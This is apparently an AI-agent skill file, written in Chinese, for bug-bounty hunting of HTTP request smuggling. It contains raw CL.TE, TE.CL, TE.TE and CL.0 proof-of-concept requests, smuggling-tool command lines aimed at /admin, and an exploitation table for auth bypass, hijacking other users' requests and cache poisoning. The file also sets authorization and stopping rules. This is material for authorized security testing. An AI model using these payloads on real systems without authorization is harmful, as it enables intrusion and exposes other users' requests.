---
name: hunt-http-smuggling
description: HTTP 请求走私 / 请求降级：CL.TE、TE.CL、TE.TE、CL.0 与 H2→H1 desync 判定 PoC、探测工具链、前置代理与后端解析差异识别、利用链（劫持他人请求/绕过鉴权/缓存投毒）
whenToUse: 目标前置 CDN/WAF/Nginx 且后端是另一套 HTTP 服务；或需要在 CL/TE 处理不一致上做 bypass 时
role: vuln-scan
enabled: true
---

# HTTP Request Smuggling / Desync

## 1. 一句话原理

前置代理（CDN / WAF / Nginx）和后端服务器对 `Content-Length` / `Transfer-Encoding` 的解析不一致 → 攻击者把「半包」塞进流，污染**下一个用户**的请求或响应。

SRC 价值：成功 desync = P1/P0（$2k–$10k+），且能直接把「无权限」变「有权限」。

## 2. 类型速览

| 类型 | 前置代理用 | 后端用 | 典型前置 |
|---|---|---|---|
| **CL.TE** | Content-Length | Transfer-Encoding | Nginx / HAProxy 前置 |
| **TE.CL** | Transfer-Encoding | Content-Length | 部分 CDN |
| **TE.TE** | 都看但处理混淆 | 同 | 双 TE 头混淆 |
| **CL.0** | CL=0 后端忽略 body | — | 后端直接忽略 body |
| **H2→H1 desync** | h2 前端 | h1 后端 | HTTP/2 前端降级 |

## 3. 判定 PoC（无害版，用延时确认）

**CL.TE**

```http
POST / HTTP/1.1
Host: TARGET
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

前端按 CL=6 读 `0\r\n\r\nG`，后端按 chunked 在 `0\r\n\r\n` 结束，剩 `G` 进入下一请求。

**TE.CL**

```http
POST / HTTP/1.1
Host: TARGET
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

**TE.TE（混淆）** —— 让一端认不出 TE：

```
Transfer-Encoding: chunked
Transfer-Encoding: x
---
Transfer-Encoding: chunked
Transfer-Encoding : chunked        （头名后加空格）
---
Transfer-Encoding: chunked
Transfer-encoding: cow
---
Transfer-Encoding:\tchunked        （tab）
---
Transfer-Encoding: xchunked
---
X: X
Transfer-Encoding: chunked
```

**CL.0** —— 后端完全忽略 body：

```http
POST / HTTP/1.1
Host: TARGET
Content-Length: 34

GET /admin HTTP/1.1
Host: TARGET
```

## 4. 安全探测顺序（先延时，后爆破）

1. **时间法**：构造让后端等待下一个 chunk 的包，测响应是否挂起（无副作用）。
2. **差异法**：同一请求送两次，看是否偶发 404/400/异常响应 —— desync 的典型症状。
3. **回显法**：走私一个打到自身 OAST 的请求，看 OAST 是否收到（证明请求被后端处理）。
4. **只在确认后用**：劫持他人请求、绕过前置鉴权。

**工具**

```bash
# Burp 扩展（首选）
HTTP Request Smuggler

# 命令行
smuggler.py -u https://TARGET -v
http2smugl quirks --target TARGET:443
h2csmuggler -u https://TARGET/ --path /admin
```

## 5. 利用链

| 目标 | 手法 |
|---|---|
| **绕过前置鉴权** | 走私一个 `GET /admin` 让后端当作已认证用户的下一请求 |
| **劫持他人请求** | 把半包留在缓冲区，下一个真实用户的请求头被拼到攻击者控制的路径上 |
| **缓存投毒** | 走私响应写进 CDN 缓存（与 `hunt-cache-poison` 联动） |
| **XSS 放大** | 走私带 payload 的响应，命中缓存后对所有用户生效 |
| **H2.CL / H2.TE** | HTTP/2 伪头 `content-length` 降级到 h1 后端 |

## 6. 判定标准

| 现象 | 定性 |
|---|---|
| 稳定触发后端处理走私请求（OAST 回连） | **成立**，P1 |
| 能读到他人请求内容 / 绕过鉴权 | **P0** |
| 仅偶发异常响应，无法复现 | 记为「疑似」，不报 |
| 前置与后端都规范化一致 | 不成立 |

## 7. 报告要点

- 必须给出**前置/后端两端的解析差异证据**（哪一端按什么读）。
- 附完整原始字节（含 `\r\n`），分段截图不够。
- 复现率写明（N 次中 M 次），走私常有时序性。
- 停手点：证明「后端把走私请求当独立请求处理」即可，不要真的劫持到具体用户数据。

## 8. 不要做的事

- 禁：在生产环境做「劫持真实用户请求」的完整验证。
- 禁：用走私写缓存来影响真实用户（会造成实际影响）。
- 禁：高并发反复打（desync 探测本身可能让连接池卡死）。
- 禁：在非授权目标上跑。

<!-- 改编自: src-hunter references/playbooks/http-smuggling.md (924 行), 2026-11-01 -->
